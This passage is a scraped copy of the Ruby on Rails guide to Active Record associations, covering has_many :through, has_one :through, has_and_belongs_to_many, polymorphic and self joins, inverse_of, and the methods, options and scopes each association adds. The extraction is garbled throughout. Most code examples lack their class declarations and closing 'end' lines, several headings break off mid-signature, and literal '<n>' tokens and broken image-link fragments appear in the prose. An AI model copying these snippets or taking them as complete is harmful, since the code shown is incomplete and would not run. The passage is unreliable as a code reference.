has_many :through Association Diagram](images/has_many_through.png)
class CreateAppointments < ActiveRecord::Migration
    create_table :physicians do |t|
    create_table :patients do |t|
    create_table :appointments do |t|
      t.belongs_to :physician
      t.belongs_to :patient
      t.datetime :appointment_date
The collection of join models can be managed via the API. For example, if you assign
physician.patients = patients
new join models are created for newly associated objects, and if some are gone their rows are deleted.
WARNING: Automatic deletion of join models is direct, no destroy callbacks are triggered.
The `has_many :through` association is also useful for setting up "shortcuts" through nested `has_many` associations. 
For example, if a document has many sections, and a section has many paragraphs, you may sometimes want to get a simple collection of all paragraphs in the document. 
You could set that up this way:
class Document < ActiveRecord::Base
  has_many :sections
  has_many :paragraphs, through: :sections
class Section < ActiveRecord::Base
  belongs_to :document
  has_many :paragraphs
class Paragraph < ActiveRecord::Base
  belongs_to :section
With `through: :sections` specified, Rails will now understand:
@document.paragraphs
### The `has_one :through` Association
A `has_one :through` association sets up a one-to-one connection with another model. 
This association indicates<n>that the declaring model can be matched with one instance of another model by proceeding _through_ a third model.
For example, if each supplier has one account, and each account is associated with one account history, then the<n>supplier model could look like this:
  has_one :account_history, through: :account
  belongs_to :supplier
  has_one :account_history
class AccountHistory < ActiveRecord::Base
  belongs_to :account
has_one :through Association Diagram](images/has_one_through.png)
class CreateAccountHistories < ActiveRecord::Migration
    create_table :account_histories do |t|
      t.belongs_to :account
      t.integer :credit_rating
### The `has_and_belongs_to_many` Association
A `has_and_belongs_to_many` association creates a direct many-to-many connection with another model, with no intervening model. 
For example, if your application includes assemblies and parts, with each assembly having many parts and each part appearing in many assemblies, you could declare the models this way:
class Assembly < ActiveRecord::Base
  has_and_belongs_to_many :parts
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
has_and_belongs_to_many Association Diagram](images/habtm.png)
class CreateAssembliesAndParts < ActiveRecord::Migration
    create_table :assemblies do |t|
    create_table :parts do |t|
      t.string :part_number
    create_table :assemblies_parts, id: false do |t|
      t.belongs_to :assembly
      t.belongs_to :part
### Choosing Between `belongs_to` and `has_one`
If you want to set up a one-to-one relationship between two models, you'll need to add `belongs_to` to one, and `has_one` to the other. 
How do you know which is which?
The distinction is in where you place the foreign key (it goes on the table for the class declaring the `belongs_to` association), but you should give some thought to the actual meaning of the data as well. 
The `has_one` relationship says that one of something is yours - that is, that something points back to you. 
For example, it makes more sense to say that a supplier owns an account than that an account owns a supplier. 
This suggests that the correct relationships are like this:
      t.string  :name
      t.integer :supplier_id
      t.string  :account_number
NOTE: Using `t.integer :supplier_id` makes the foreign key naming obvious and explicit. 
In current versions of Rails, you can abstract away this implementation detail by using `t.references :supplier` instead.
### Choosing Between `has_many :through` and `has_and_belongs_to_many`
Rails offers two different ways to declare a many-to-many relationship between models. 
The simpler way is to use `has_and_belongs_to_many`, which allows you to make the association directly:
The second way to declare a many-to-many relationship is to use `has_many :through`. 
This makes the association indirectly, through a join model:
  has_many :manifests
  has_many :parts, through: :manifests
class Manifest < ActiveRecord::Base
  belongs_to :assembly
  belongs_to :part
  has_many :assemblies, through: :manifests
The simplest rule of thumb is that you should set up a `has_many :through` relationship if you need to work with the relationship model as an independent entity. 
If you don't need to do anything with the relationship model, it may be simpler to set up a `has_and_belongs_to_many` relationship (though you'll need to remember to create the joining table in the database).
You should use `has_many :through` if you need validations, callbacks, or extra attributes on the join model.
### Polymorphic Associations
A slightly more advanced twist on associations is the _polymorphic association_. 
With polymorphic associations, a model can belong to more than one other model, on a single association. 
For example, you might have a picture model that belongs to either an employee model or a product model. 
Here's how this could be declared:
class Picture < ActiveRecord::Base
  belongs_to :imageable, polymorphic: true
class Employee < ActiveRecord::Base
  has_many :pictures, as: :imageable
You can think of a polymorphic `belongs_to` declaration as setting up an interface that any other model can use. 
From an instance of the `Employee` model, you can retrieve a collection of pictures: `@employee.pictures`.
Similarly, you can retrieve `@product.pictures`.
If you have an instance of the `Picture` model, you can get to its parent via `@picture.imageable`. 
To make this work, you need to declare both a foreign key column and a type column in the model that declares the polymorphic interface:
class CreatePictures < ActiveRecord::Migration
    create_table :pictures do |t|
      t.string  :name
      t.integer :imageable_id
      t.string  :imageable_type
This migration can be simplified by using the `t.references` form:
      t.string :name
      t.references :imageable, polymorphic: true
Polymorphic Association Diagram](images/polymorphic.png)
### Self Joins
In designing a data model, you will sometimes find a model that should have a relation to itself. 
For example, you may want to store all employees in a single database model, but be able to trace relationships such as between manager and subordinates. 
This situation can be modeled with self-joining associations:
  has_many :subordinates, class_name: "Employee",
                          foreign_key: "manager_id"
  belongs_to :manager, class_name: "Employee"
With this setup, you can retrieve `@employee.subordinates` and `@employee.manager`.
In your migrations/schema, you will add a references column to the model itself.
class CreateEmployees < ActiveRecord::Migration
    create_table :employees do |t|
      t.references :manager
Tips, Tricks, and Warnings
Here are a few things you should know to make efficient use of Active Record associations in your Rails applications:
* Controlling caching
* Avoiding name collisions
* Updating the schema
* Controlling association scope
* Bi-directional associations
### Controlling Caching
All of the association methods are built around caching, which keeps the result of the most recent query available for further operations. 
The cache is even shared across methods. 
customer.orders                 # retrieves orders from the database
customer.orders.size            # uses the cached copy of orders
customer.orders.empty?          
# uses the cached copy of orders
But what if you want to reload the cache, because data might have been changed by some other part of the application? 
Just pass `true` to the association call:
customer.orders(true).empty?    
# discards the cached copy of orders
                                # and goes back to the database
### Avoiding Name Collisions
You are not free to use just any name for your associations. 
Because creating an association adds a method with that name to the model, it is a bad idea to give an association a name that is already used for an instance method of `ActiveRecord::Base`. 
The association method would override the base method and break things. 
For instance, `attributes` or `connection` are bad names for associations.
### Updating the Schema
Associations are extremely useful, but they are not magic. 
You are responsible for maintaining your database schema to match your associations. 
In practice, this means two things, depending on what sort of associations you are creating. 
For `belongs_to` associations you need to create foreign keys, and for `has_and_belongs_to_many` associations you need to create the appropriate join table.
#### Creating Foreign Keys for `belongs_to` Associations
When you declare a `belongs_to` association, you need to create foreign keys as appropriate. 
For example, consider this model:
This declaration needs to be backed up by the proper foreign key declaration on the orders table:
      t.string   :order_number
      t.integer  :customer_id
If you create an association some time after you build the underlying model, you need to remember to create an `add_column` migration to provide the necessary foreign key.
#### Creating Join Tables for `has_and_belongs_to_many` Associations
If you create a `has_and_belongs_to_many` association, you need to explicitly create the joining table. 
Unless the name of the join table is explicitly specified by using the `:join_table` option, Active Record creates the name by using the lexical order of the class names. 
So a join between customer and order models will give the default join table name of "customers_orders" because "c" outranks "o" in lexical ordering.
WARNING: The precedence between model names is calculated using the `<` operator for `String`. 
This means that if the strings are of different lengths, and the strings are equal when compared up to the shortest length, then the longer string is considered of higher lexical precedence than the shorter one. 
Whatever the name, you must manually generate the join table with an appropriate migration. 
For example, consider these associations:
These need to be backed up by a migration to create the `assemblies_parts` table. 
This table should be created without a primary key:
class CreateAssembliesPartsJoinTable < ActiveRecord::Migration
      t.integer :assembly_id
      t.integer :part_id
We pass `id: false` to `create_table` because that table does not represent a model. 
That's required for the association to work properly. 
If you observe any strange behavior in a `has_and_belongs_to_many` association like mangled models IDs, or exceptions about conflicting IDs, chances are you forgot that bit.
### Controlling Association Scope
By default, associations look for objects only within the current module's scope. 
This can be important when you declare Active Record models within a module. 
module MyApplication
  module Business
    class Supplier < ActiveRecord::Base
       has_one :account
    class Account < ActiveRecord::Base
       belongs_to :supplier
This will work fine, because both the `Supplier` and the `Account` class are defined within the same scope. 
But the following will _not_ work, because `Supplier` and `Account` are defined in different scopes:
  module Billing
To associate a model with a model in a different namespace, you must specify the complete class name in your association declaration:
       has_one :account,
        class_name: "MyApplication::Billing::Account"
       belongs_to :supplier,
        class_name: "MyApplication::Business::Supplier"
### Bi-directional Associations
It's normal for associations to work in two directions, requiring declaration on two different models:
By default, Active Record doesn't know about the connection between these associations. 
This can lead to two copies of an object getting out of sync:
c = Customer.first
o = c.orders.first
c.first_name == o.customer.first_name # => true
c.first_name = 'Manny'
c.first_name == o.customer.first_name # => false
This happens because c and o.customer are two different in-memory representations of the same data, and neither one is automatically refreshed from changes to the other. 
Active Record provides the `:inverse_of` option so that you can inform it of these relations:
  has_many :orders, inverse_of: :customer
  belongs_to :customer, inverse_of: :orders
With these changes, Active Record will only load one copy of the customer object, preventing inconsistencies and making your application more efficient:
There are a few limitations to `inverse_of` support:
* They do not work with `:through` associations.
* They do not work with `:polymorphic` associations.
* They do not work with `:as` associations.
* For `belongs_to` associations, `has_many` inverse associations are ignored.
Every association will attempt to automatically find the inverse association<n>and set the `:inverse_of` option heuristically (based on the association name).
Most associations with standard names will be supported. 
However, associations<n>that contain the following options will not have their inverses set<n>automatically:
* :conditions
* :through
* :polymorphic
* :foreign_key
Detailed Association Reference
The following sections give the details of each type of association, including the methods that they add and the options that you can use when declaring an association.
### `belongs_to` Association Reference
The `belongs_to` association creates a one-to-one match with another model. 
In database terms, this association says that this class contains the foreign key. 
If the other class contains the foreign key, then you should use `has_one` instead.
#### Methods Added by `belongs_to`
When you declare a `belongs_to` association, the declaring class automatically gains five methods related to the association:
* `association(force_reload = false)`
* `association=(associate)`
* `build_association(attributes = {})`
* `create_association(attributes = {})`
* `create_association!(
attributes = {})`
In all of these methods, `association` is replaced with the symbol passed as the first argument to `belongs_to`. 
For example, given the declaration:
customer
customer=
build_customer
create_customer
create_customer!
NOTE: When initializing a new `has_one` or `belongs_to` association you must use the `build_` prefix to build the association, rather than the `association.build` method that would be used for `has_many` or `has_and_belongs_to_many` associations. 
To create one, use the `create_` prefix.
##### `association(force_reload = false)`
The `association` method returns the associated object, if any. 
If no associated object is found, it returns `nil`.
@customer = @order.customer
If the associated object has already been retrieved from the database for this object, the cached version will be returned. 
To override this behavior (and force a database read), pass `true` as the `force_reload` argument.
##### `association=(associate)`
The `association=` method assigns an associated object to this object. 
Behind the scenes, this means extracting the primary key from the associate object and setting this object's foreign key to the same value.
@order.customer = @customer
##### `build_association(attributes = {})`
The `build_association` method returns a new object of the associated type. 
This object will be instantiated from the passed attributes, and the link through this object's foreign key will be set, but the associated object will _not_ yet be saved.
@customer = @order.build_customer(customer_number: 123,
                                  customer_name: "John Doe")
##### `create_association(attributes = {})`
The `create_association` method returns a new object of the associated type. 
This object will be instantiated from the passed attributes, the link through this object's foreign key will be set, and, once it passes all of the validations specified on the associated model, the associated object _will_ be saved.
@customer = @order.create_customer(customer_number: 123,
                                   customer_name: "John Doe")
##### `create_association!(
Does the same as `create_association` above, but raises `ActiveRecord::RecordInvalid` if the record is invalid.
#### Options for `belongs_to`
While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the `belongs_to` association reference. 
Such customizations can easily be accomplished by passing options and scope blocks when you create the association. 
For example, this association uses two such options:
  belongs_to :customer, dependent: :destroy,
    counter_cache: true
The `belongs_to` association supports these options:
* `:autosave`
* `:class_name`
* `:counter_cache`
* `:dependent`
* `:foreign_key`
* `:inverse_of`
* `:polymorphic`
* `:touch`
* `:validate`
##### `:autosave`
If you set the `:autosave` option to `true`, Rails will save any loaded members and destroy members that are marked for destruction whenever you save the parent object.
##### `:class_name`
If the name of the other model cannot be derived from the association name, you can use the `:class_name` option to supply the model name. 
For example, if an order belongs to a customer, but the actual name of the model containing customers is `Patron`, you'd set things up this way:
  belongs_to :customer, class_name: "Patron"
##### `:counter_cache`
The `:counter_cache` option can be used to make finding the number of belonging objects more efficient. 
Consider these models:
With these declarations, asking for the value of `@customer.orders.size` requires making a call to the database to perform a `COUNT(*)` query. 
To avoid this call, you can add a counter cache to the _belonging_ model:
  belongs_to :customer, counter_cache: true
With this declaration, Rails will keep the cache value up to date, and then return that value in response to the `size` method.
Although the `:counter_cache` option is specified on the model that includes the `belongs_to` declaration, the actual column must be added to the _associated_ model. 
In the case above, you would need to add a column named `orders_count` to the `Customer` model. 
You can override the default column name if you need to:
  belongs_to :customer, counter_cache: :count_of_orders
Counter cache columns are added to the containing model's list of read-only attributes through `attr_readonly`.
##### `:dependent`
If you set the `:dependent` option to:
* `:destroy`, when the object is destroyed, `destroy` will be called on its<n>associated objects.
* `:delete`, when the object is destroyed, all its associated objects will be<n>deleted directly from the database without calling their `destroy` method.
WARNING: You should not specify this option on a `belongs_to` association that is connected with a `has_many` association on the other class. 
Doing so can lead to orphaned records in your database.
##### `:foreign_key`
By convention, Rails assumes that the column used to hold the foreign key on this model is the name of the association with the suffix `_id` added. 
The `:foreign_key` option lets you set the name of the foreign key directly:
  belongs_to :customer, class_name: "Patron",
                        foreign_key: "patron_id"
TIP: In any case, Rails will not create foreign key columns for you. 
You need to explicitly define them as part of your migrations.
##### `:inverse_of`
The `:inverse_of` option specifies the name of the `has_many` or `has_one` association that is the inverse of this association. 
Does not work in combination with the `:polymorphic` options.
##### `:polymorphic`
Passing `true` to the `:polymorphic` option indicates that this is a polymorphic association. 
Polymorphic associations were discussed in detail <a href="#polymorphic-associations">earlier in this guide</a>.
##### `:touch`
If you set the `:touch` option to `:true`, then the `updated_at` or `updated_on` timestamp on the associated object will be set to the current time whenever this object is saved or destroyed:
  belongs_to :customer, touch: true
In this case, saving or destroying an order will update the timestamp on the associated customer. 
You can also specify a particular timestamp attribute to update:
  belongs_to :customer, touch: :orders_updated_at
##### `:validate`
If you set the `:validate` option to `true`, then associated objects will be validated whenever you save this object. 
By default, this is `false`: associated objects will not be validated when this object is saved.
#### Scopes for `belongs_to`
There may be times when you wish to customize the query used by `belongs_to`. 
Such customizations can be achieved via a scope block. 
  belongs_to :customer, -> { where active: true },
                        dependent: :destroy
You can use any of the standard [querying methods](active_record_querying.html) inside the scope block. 
The following ones are discussed below:
##### `where`
The `where` method lets you specify the conditions that the associated object must meet.
  belongs_to :customer, -> { where active: true }
##### `includes`
You can use the `includes` method to specify second-order associations that should be eager-loaded when this association is used. 
For example, consider these models:
  has_many :line_items
If you frequently retrieve customers directly from line items (`@line_item.order.customer`), then you can make your code somewhat more efficient by including customers in the association from line items to orders:
  belongs_to :order, -> { includes :customer }
NOTE: There's no need to use `includes` for immediate associations - that is, if you have `Order belongs_to :customer`, then the customer is eager-loaded automatically when it's needed.
##### `readonly`
If you use `readonly`, then the associated object will be read-only when retrieved via the association.
##### `select`
The `select` method lets you override the SQL `SELECT` clause that is used to retrieve data about the associated object. 
By default, Rails retrieves all columns.
TIP: If you use the `select` method on a `belongs_to` association, you should also set the `:foreign_key` option to guarantee the correct results.
#### Do Any Associated Objects Exist?
You can see if any associated objects exist by using the `association.nil?` method:
if @order.customer.nil?
  @msg = "No customer found for this order"
#### When are Objects Saved?
Assigning an object to a `belongs_to` association does _not_ automatically save the object. 
It does not save the associated object either.
### `has_one` Association Reference
The `has_one` association creates a one-to-one match with another model. 
In database terms, this association says that the other class contains the foreign key. 
If this class contains the foreign key, then you should use `belongs_to` instead.
#### Methods Added by `has_one`
When you declare a `has_one` association, the declaring class automatically gains five methods related to the association:
In all of these methods, `association` is replaced with the symbol passed as the first argument to `has_one`. 
For example, given the declaration:
Each instance of the `Supplier` model will have these methods:
account
account=
build_account
create_account
create_account!
@account = @supplier.account
Behind the scenes, this means extracting the primary key from this object and setting the associate object's foreign key to the same value.
@supplier.account = @account
This object will be instantiated from the passed attributes, and the link through its foreign key will be set, but the associated object will _not_ yet be saved.
@account = @supplier.build_account(terms: "Net 30")
This object will be instantiated from the passed attributes, the link through its foreign key will be set, and, once it passes all of the validations specified on the associated model, the associated object _will_ be saved.
@account = @supplier.create_account(terms: "Net 30")
#### Options for `has_one`
While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the `has_one` association reference. 
Such customizations can easily be accomplished by passing options when you create the association. 
  has_one :account, class_name: "Billing", dependent: :nullify
The `has_one` association supports these options:
* `:as`
* `:primary_key`
* `:source`
* `:source_type`
* `:through`
##### `:as`
Setting the `:as` option indicates that this is a polymorphic association. 
For example, if a supplier has an account, but the actual name of the model containing accounts is `Billing`, you'd set things up this way:
  has_one :account, class_name: "Billing"
Controls what happens to the associated object when its owner is destroyed:
* `:destroy` causes the associated object to also be destroyed
* `:delete` causes the associated object to be deleted directly from the database (so callbacks will not execute)
* `:nullify` causes the foreign key to be set to `NULL`. 
Callbacks are not executed.
* `:restrict_with_exception` causes an exception to be raised if there is an associated record
* `:restrict_with_error` causes an error to be added to the owner if there is an associated object
It's necessary not to set or leave `:nullify` option for those associations<n>that have `NOT NULL` database constraints. 
If you don't set `dependent` to<n>destroy such associations you won't be able to change the associated object<n>because initial associated object foreign key will be set to unallowed `NULL`<n>value.
By convention, Rails assumes that the column used to hold the foreign key on the other model is the name of this model with the suffix `_id` added. 
  has_one :account, foreign_key: "supp_id"
The `:inverse_of` option specifies the name of the `belongs_to` association that is the inverse of this association. 
Does not work in combination with the `:through` or `:as` options.
  has_one :account, inverse_of: :supplier
  belongs_to :supplier, inverse_of: :account
##### `:primary_key`
By convention, Rails assumes that the column used to hold the primary key of this model is `id`. 
You can override this and explicitly specify the primary key with the `:primary_key` option.
##### `:source`
The `:source` option specifies the source association name for a `has_one :through` association.
##### `:source_type`
The `:source_type` option specifies the source association type for a `has_one :through` association that proceeds through a polymorphic association.
##### `:through`
The `:through` option specifies a join model through which to perform the query. 
#### Scopes for `has_one`
There may be times when you wish to customize the query used by `has_one`. 
  has_one :account, -> { where active: true }
  has_one :account, -> { where "confirmed = 1" }
  belongs_to :representative
class Representative < ActiveRecord::Base
  has_many :accounts
If you frequently retrieve representatives directly from suppliers (`@supplier.account.representative`), then you can make your code somewhat more efficient by including representatives in the association from suppliers to accounts:
  has_one :account, -> { includes :representative }
If you use the `readonly` method, then the associated object will be read-only when retrieved via the association.
if @supplier.account.nil?
  @msg = "No account found for this supplier"
When you assign an object to a `has_one` association, that object is automatically saved (in order to update its foreign key). 
In addition, any object being replaced is also automatically saved, because its foreign key will change too.
If either of these saves fails due to validation errors, then the assignment statement returns `false` and the assignment itself is cancelled.
If the parent object (the one declaring the `has_one` association) is unsaved (that is, `new_record?` returns `true`) then the child objects are not saved. 
They will automatically when the parent object is saved.
If you want to assign an object to a `has_one` association without saving the object, use the `association.build` method.
### `has_many` Association Reference
The `has_many` association creates a one-to-many relationship with another model. 
In database terms, this association says that the other class will have a foreign key that refers to instances of this class.
#### Methods Added by `has_many`
When you declare a `has_many` association, the declaring class automatically gains 16 methods related to the association:
* `collection(force_reload = false)`
* `collection<<(object, ...)
* `collection.delete(object, ...)
* `collection.destroy(object, ...)
* `collection_singular_ids`
* `collection.clear`
* `collection.empty?
* `collection.size`
* `collection.find(...)
* `collection.where(...)
* `collection.exists?(...)
* `collection.build(attributes = {}, ...)
* `collection.create(attributes = {})`
* `collection.create!(
In all of these methods, `collection` is replaced with the symbol passed as the first argument to `has_many`, and `collection_singular` is replaced with the singularized version of that symbol. 
orders(force_reload = false)
orders<<(object, ...)
orders.delete(object, ...)
orders.destroy(object, ...)
order_ids
orders.clear
orders.empty?
orders.size
orders.find(...)
orders.where(...)
orders.exists?(...)
orders.build(attributes = {}, ...)
orders.create(attributes = {})
attributes = {})
##### `collection(force_reload = false)`
The `collection` method returns an array of all of the associated objects. 
If there are no associated objects, it returns an empty array.
@orders = @customer.orders
##### `collection<<(object, ...)
The `collection<<` method adds one or more objects to the collection by setting their foreign keys to the primary key of the calling model.
@customer.orders << @order1
##### `collection.delete(object, ...)
The `collection.delete` method removes one or more objects from the collection by setting their foreign keys to `NULL`.
@customer.orders.delete(@order1)
WARNING: Additionally, objects will be destroyed if they're associated with `dependent: :destroy`, and deleted if they're associated with `dependent: :delete_all`.
##### `collection.destroy(object, ...)
The `collection.destroy` method removes one or more objects from the collection by running `destroy` on each object.
@customer.orders.destroy(@order1)
WARNING: Objects will _always_ be removed from the database, ignoring the `:dependent` option.
The `collection=` method makes the collection contain only the supplied objects, by adding and deleting as appropriate.
##### `collection_singular_ids`
The `collection_singular_ids` method returns an array of the ids of the objects in the collection.
@order_ids = @customer.order_ids
The `collection_singular_ids=` method makes the collection contain only the objects identified by the supplied primary key values, by adding and deleting as appropriate.
##### `collection.clear`
The `collection.clear` method removes every object from the collection. 
This destroys the associated objects if they are associated with `dependent: :destroy`, deletes them directly from the database if `dependent: :delete_all`, and otherwise sets their foreign keys to `NULL`.
##### `collection.empty?
The `collection.empty?` method returns `true` if the collection does not contain any associated objects.
<% if @customer.orders.empty? 
  No Orders Found
##### `collection.size`
The `collection.size` method returns the number of objects in the collection.
@order_count = @customer.orders.size
##### `collection.find(...)
The `collection.find` method finds objects within the collection. 
It uses the same syntax and options as `ActiveRecord::Base.find`.<n><n>
@open_orders = @customer.orders.find(1)
##### `collection.where(...)
The `collection.where` method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object(s) are accessed.<n><n>
@open_orders = @customer.orders.where(open: true) # No query yet
@open_order = @open_orders.first # Now the database will be queried
##### `collection.exists?(...)
The `collection.exists?` method checks whether an object meeting the supplied <n>conditions exists in the collection. 
##### `collection.build(attributes = {}, ...)
The `collection.build` method returns one or more new objects of the associated type. 
These objects will be instantiated from the passed attributes, and the link through their foreign key will be created, but the associated objects will _not_ yet be saved.
@order = @customer.orders.build(order_date: Time.now,
                                order_number: "A12345")
##### `collection.create(attributes = {})`
The `collection.create` method returns a new object of the associated type. 
This object will be instantiated from the passed attributes, the link through its foreign key will be created, and, once it passes all of the validations specified on the associated model, the associated object _will_ be saved.
@order = @customer.orders.create(order_date: Time.now,
                                 order_number: "A12345")
##### `collection.create!(
Does the same as `collection.create` above, but raises `ActiveRecord::RecordInvalid` if the record is invalid.
#### Options for `has_many`
While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the `has_many` association reference. 
  has_many :orders, dependent: :delete_all, validate: :false
The `has_many` association supports these options:
For example, if a customer has many orders, but the actual name of the model containing orders is `Transaction`, you'd set things up this way:
  has_many :orders, class_name: "Transaction"
Controls what happens to the associated objects when their owner is destroyed:
* `:destroy` causes all the associated objects to also be destroyed
* `:delete_all` causes all the associated objects to be deleted directly from the database (so callbacks will not execute)
* `:nullify` causes the foreign keys to be set to `NULL`. 
* `:restrict_with_exception` causes an exception to be raised if there are any associated records
* `:restrict_with_error` causes an error to be added to the owner if there are any associated objects
  has_many :orders, foreign_key: "cust_id"
By convention, Rails assumes that the column used to hold the primary key of the association is `id`. 
Let's say that `users` table has `id` as the primary_key but it also has<n>`guid` column. 
And the requirement is that `todos` table should hold<n>`guid` column value and not `id` value. 
This can be achieved like this
  has_many :todos, primary_key: :guid
Now if we execute `@user.todos.create` then `@todo` record will have<n>`user_id` value as the `guid` value of `@user`.
The `:source` option specifies the source association name for a `has_many :through` association. 
You only need to use this option if the name of the source association cannot be automatically inferred from the association name.
The `:source_type` option specifies the source association type for a `has_many :through` association that proceeds through a polymorphic association.
If you set the `:validate` option to `false`, then associated objects will not be validated whenever you save this object. 
By default, this is `true`: associated objects will be validated when this object is saved.
#### Scopes for `has_many`
There may be times when you wish to customize the query used by `has_many`. 
  has_many :orders, -> { where processed: true }
  has_many :confirmed_orders, -> { where "confirmed = 1" },
    class_name: "Order"
You can also set conditions via a hash:
  has_many :confirmed_orders, -> { where confirmed: true },
                              class_name: "Order"
If you use a hash-style `where` option, then record creation via this association will be automatically scoped using the hash. 
In this case, using `@customer.confirmed_orders.create` or `@customer.confirmed_orders.build` will create orders where the confirmed column has the value `true`.
##### `extending`
The `extending` method specifies a named module to extend the association proxy. 
##### `group`
The `group` method supplies an attribute name to group the result set by, using a `GROUP BY` clause in the finder SQL.
  has_many :line_items, -> { group 'orders.id' },
                        through: :orders
If you frequently retrieve line items directly from customers (`@customer.orders.line_items`), then you can make your code somewhat more efficient by including line items in the association from customers to orders:
  has_many :orders, -> { includes :line_items }
##### `limit`
The `limit` method lets you restrict the total number of objects that will be fetched through an association.
  has_many :recent_orders,
    -> { order('order_date desc').limit(100) },
    class_name: "Order",
##### `offset`
The `offset` method lets you specify the starting offset for fetching objects via an association. 
For example, `-> { offset(11) }` will skip the first 11 records.
##### `order`
The `order` method dictates the order in which associated objects will be received (in the syntax used by an SQL `ORDER BY` clause).
  has_many :orders, -> { order "date_confirmed DESC" }
If you use the `readonly` method, then the associated objects will be read-only when retrieved via the association.
The `select` method lets you override the SQL `SELECT` clause that is used to retrieve data about the associated objects. 
WARNING: If you specify your own `select`, be sure to include the primary key and foreign key columns of the associated model. 
If you do not, Rails will throw an error.
##### `distinct`
Use the `distinct` method to keep the collection free of duplicates. 
This is<n>mostly useful together with the `:through` option.
  has_many :readings
person = Person.create(name: 'John')
Now let's set `distinct`:
person = Person.create(name: 'Honda')
In the above case there are still two readings. 
If you want to make sure that, upon insertion, all of the records in the<n>persisted association are distinct (so that you can be sure that when you<n>inspect the association that you will never find duplicate records), you should<n>add a unique index on the table itself. 
Note that checking for uniqueness using something like `include?` is subject<n>to race conditions. 
Do not attempt to use `include?` to enforce distinctness<n>in an association. 
When you assign an object to a `has_many` association, that object is automatically saved (in order to update its foreign key). 
If you assign multiple objects in one statement, then they are all saved.
If any of these saves fails due to validation errors, then the assignment statement returns `false` and the assignment itself is cancelled.
If the parent object (the one declaring the `has_many` association) is unsaved (that is, `new_record?` returns `true`) then the child objects are not saved when they are added. 
All unsaved members of the association will automatically be saved when the parent is saved.
If you want to assign an object to a `has_many` association without saving the object, use the `collection.build` method.
### `has_and_belongs_to_many` Association Reference
The `has_and_belongs_to_many` association creates a many-to-many relationship with another model. 
In database terms, this associates two classes via an intermediate join table that includes foreign keys referring to each of the classes.
#### Methods Added by `has_and_belongs_to_many`
When you declare a `has_and_belongs_to_many` association, the declaring class automatically gains 16 methods related to the association:
* `collection.build(attributes = {})`
In all of these methods, `collection` is replaced with the symbol passed as the first argument to `has_and_belongs_to_many`, and `collection_singular` is replaced with the singularized version of that symbol. 
assemblies(force_reload = false)
assemblies<<(object, ...)
assemblies.delete(object, ...)
assemblies.destroy(object, ...)
assembly_ids
assemblies.clear
assemblies.empty?
assemblies.size
assemblies.find(...)
assemblies.where(...)
assemblies.exists?(...)
assemblies.build(attributes = {}, ...)
assemblies.create(attributes = {})
assemblies.create!(attributes = {})
##### Additional Column Methods
If the join table for a `has_and_belongs_to_many` association has additional columns beyond the two foreign keys, these columns will be added as attributes to records retrieved via that association. 
Records returned with additional attributes will always be read-only, because Rails cannot save changes to those attributes.
WARNING: The use of extra attributes on the join table in a `has_and_belongs_to_many` association is deprecated. 
If you require this sort of complex behavior on the table that joins two models in a many-to-many relationship, you should use a `has_many :through` association instead of `has_and_belongs_to_many`.
@assemblies = @part.assemblies
The `collection<<` method adds one or more objects to the collection by creating records in the join table.
@part.assemblies << @assembly1
NOTE: This method is aliased as `collection.concat` and `collection.push`.
The `collection.delete` method removes one or more objects from the collection by deleting records in the join table. 
This does not destroy the objects.
@part.assemblies.delete(@assembly1)
WARNING: This does not trigger callbacks on the join records.
The `collection.destroy` method removes one or more objects from the collection by running `destroy` on each record in the join table, including running callbacks. 
@part.assemblies.destroy(@assembly1)
@assembly_ids = @part.assembly_ids
The `collection.clear` method removes every object from the collection by deleting the rows from the joining table. 
This does not destroy the associated objects.
<% if @part.assemblies.empty? 
  This part is not used in any assemblies
@assembly_count = @part.assemblies.size
It uses the same syntax and options as `ActiveRecord::Base.find`. 
It also adds the additional condition that the object must be in the collection.
@assembly = @part.assemblies.find(1)
The `collection.where` method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object(s) are accessed. 
@new_assemblies = @part.assemblies.where("created_at > ?", 2.days.ago)
The `collection.exists?` method checks whether an object meeting the supplied<n>conditions exists in the collection. 
##### `collection.build(attributes = {})`
The `collection.build` method returns a new object of the associated type. 
This object will be instantiated from the passed attributes, and the link through the join table will be created, but the associated object will _not_ yet be saved.
@assembly = @part.assemblies.build({assembly_name: "Transmission housing"})
This object will be instantiated from the passed attributes, the link through the join table will be created, and, once it passes all of the validations specified on the associated model, the associated object _will_ be saved.
@assembly = @part.assemblies.create({assembly_name: "Transmission housing"})
Does the same as `collection.create`, but raises `ActiveRecord::RecordInvalid` if the record is invalid.
#### Options for `has_and_belongs_to_many`
While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the `has_and_belongs_to_many` association reference. 
class Parts < ActiveRecord::Base
  has_and_belongs_to_many :assemblies,
The `has_and_belongs_to_many` association supports these options:
* `:association_foreign_key`
* `:join_table`
##### `:association_foreign_key`
By convention, Rails assumes that the column in the join table used to hold the foreign key pointing to the other model is the name of that model with the suffix `_id` added. 
The `:association_foreign_key` option lets you set the name of the foreign key directly:
TIP: The `:foreign_key` and `:association_foreign_key` options are useful when setting up a many-to-many self-join. 
  has_and_belongs_to_many :friends,
      class_name: "User",
      foreign_key: "this_user_id",
      association_foreign_key: "other_user_id"
For example, if a part has many assemblies, but the actual name of the model containing assemblies is `Gadget`, you'd set things up this way:
  has_and_belongs_to_many :assemblies, class_name: "Gadget"
By convention, Rails assumes that the column in the join table used to hold the foreign key pointing to this model is the name of this model with the suffix `_id` added. 
##### `:join_table`
If the default name of the join table, based on lexical ordering, is not what you want, you can use the `:join_table` option to override the default.
#### Scopes for `has_and_belongs_to_many`
There may be times when you wish to customize the query used by `has_and_belongs_to_many`. 
  has_and_belongs_to_many :assemblies, -> { where active: true }
    -> { where "factory = 'Seattle'" }
    -> { where factory: 'Seattle' }
If you use a hash-style `where`, then record creation via this association will be automatically scoped using the hash. 
In this case, using `@parts.assemblies.create` or `@parts.assemblies.build` will create orders where the `factory` column has the value "Seattle".
  has_and_belongs_to_many :assemblies, -> { group "factory" }
You can use the `includes` method to specify second-order associations that should be eager-loaded when this association is used.<n><n>
    -
For example, if you set `offset(11)`, it will skip the first 11 records.
##### `uniq`
Use the `uniq` method to remove duplicates from the collection.
When you assign an object to a `has_and_belongs_to_many` association, that object is automatically saved (in order to update the join table). 
